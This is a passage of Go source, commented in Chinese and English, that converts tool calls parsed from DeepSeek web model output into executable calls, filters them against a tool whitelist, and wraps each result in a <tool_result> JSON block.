// ID 字段，而执行内核的 tool 消息需要 ToolCallID；用 name + 规范化参数
// JSON 的 SHA-256 摘要代替——同一调用（同工具同参数）跨轮次得到同一 ID，
// 便于识别。工具使用统计按 name 记录（tools/tool_usage 表），不受 ID 影响。
// 截断为前 8 字节（64-bit 空间）：单次 webchat 会话只有几十个调用，碰撞
// 概率可忽略；完整摘要会放长日志与消息，收益不成比例。
func dsmlToolCallID(name, argsJSON string) string {
	sum := sha256.Sum256([]byte(name + "\x00" + argsJSON))
	return fmt.Sprintf("dsml_%x", sum[:8])
}

// dsmlExecPlan 记录一个 DSML 调用在 ExecuteDSMLToolCalls 中的去向：
// content != nil 表示调用在转换阶段就被拒绝（不执行），直接使用该错误
// 结果；否则 index 是它在可执行列表 tcs（也是 outcomes）中的下标。
type dsmlExecPlan struct {
	content *ToolContent
	index   int
}

// dsmlCallsToToolCalls 把解析出的 DSML 调用转换为协议 ToolCall，交给
// executeToolCalls 批量执行。转换失败的调用（工具不在白名单、参数缺失、
// 危险命令被拦截）不进执行列表，由计划表记录错误结果，保证输出与原始
// 调用 1:1 对齐——专家按顺序对应它自己发出的 tool_calls。
func dsmlCallsToToolCalls(calls []DSMLCall) (tcs []prompt.ToolCall, plan []dsmlExecPlan) {
	plan = make([]dsmlExecPlan, 0, len(calls))
	for _, inv := range calls {
		name, args, err := normalizeDSMLInvoke(inv)
		if err != nil {
			plan = append(plan, dsmlExecPlan{content: &ToolContent{ToolName: inv.Name, Error: err.Error()}})
			continue
		}
		argsJSON, err := json.Marshal(args)
		if err != nil {
			plan = append(plan, dsmlExecPlan{content: &ToolContent{ToolName: inv.Name, Error: err.Error()}})
			continue
		}
		tcs = append(tcs, prompt.ToolCall{
			ID:   dsmlToolCallID(name, string(argsJSON)),
			Type: "function",
			Function: prompt.ToolCallFunction{
				Name:      name,
				Arguments: string(argsJSON),
			},
		})
		plan = append(plan, dsmlExecPlan{index: len(tcs) - 1})
	}
	return tcs, plan
}

// ExecuteDSMLToolCalls executes parsed DSML calls in order and returns one
// feedback block per call, wrapped the way DeepSeek web models expect:
//
//	<tool_result>{"result":...,"warning":...,"error":...}</tool_result>
//
// (see the DSML encoding README: tool execution results are wrapped in
// <tool_result> tags within user messages, sorted by the order of the
// corresponding tool_calls in the preceding assistant message). The JSON
// payload is the ToolContent shape (result/warning/error), omitzero applied.
// Blocks are 1:1 with the input calls, in order — a call rejected before
// execution (destructive command, missing parameter) still gets its own
// error block so the expert can adapt its approach.
//
// A call whose name is outside the whitelist is never executable and is
// skipped silently (debug log, no output block): fenced-code quotes never
// parse (see dsmlBlockRanges), but a bare reference in prose - e.g. an
// expert quoting the DSML test corpus - still does, and feeding an
// "unsupported tool" error back into the conversation makes the model
// argue with itself about a call it never intended.
//
// Execution reuses the HandleToolCalls core (usage statistics, result
// truncation, dual-message split) but does NOT persist tool messages: the
// web conversation lives in the browser, and writing results into the
// current session's messages table would break the assistant↔tool pairing
// that CleanupReverse relies on (the whole ask_expert turn would be dropped
// from history).
func ExecuteDSMLToolCalls(ctx context.Context, calls []DSMLCall) (outputs []string) {
	span, ctx := clog.StartSpanFromContext(ctx, "ExecuteDSMLToolCalls")
	defer span.Finish()

	kept := make([]DSMLCall, 0, len(calls))
	for _, inv := range calls {
		if dsmlToolNames[inv.Name] {
			kept = append(kept, inv)
		} else {
			outfmt.Debug("DSML skipped non-whitelisted tool %q (quoted example or unknown name)", inv.Name)
		}
	}
	calls = kept
	if len(calls) == 0 {
		return nil
	}

	tcs, plan := dsmlCallsToToolCalls(calls)
	outcomes, dualUsers := executeToolCalls(ctx, tcs, false)
	if len(dualUsers) > 0 {
		// 不变式被打破（见 dsmlToolNames）：白名单工具不应返回 DualMessage，
		// 静默丢弃会丢数据，至少留一条 debug 线索。
		outfmt.Debug("DSML dropped %d dual user message(s); whitelist assumption broken", len(dualUsers))
	}
	for _, step := range plan {
		if step.content != nil {
			outputs = append(outputs, formatDSMLToolResult(step.content))
			continue
		}
		outputs = append(outputs, formatDSMLToolResult(&outcomes[step.index].Content))
	}
	return outputs
}

// formatDSMLToolResult serializes one tool outcome as a DSML tool_result
// block. An all-empty result is normalized to "(no output)" so the model
// sees an explicit answer instead of an empty payload.
func formatDSMLToolResult(c *ToolContent) string {
	dup := *c // never mutate the caller's ToolContent (and avoid shadowing copy)
	if dup.Result == "" && dup.Error == "" && dup.Warning == "" {
		dup.Result = "(no output)"
	}
	b, err := json.Marshal(&dup)
	if err != nil { // unreachable: ToolContent fields are strings only
		return fmt.Sprintf(`<tool_result>{"error":%q}</tool_result>`, err.Error())
	}
	return "<tool_result>" + string(b) + "</tool_result>"
}
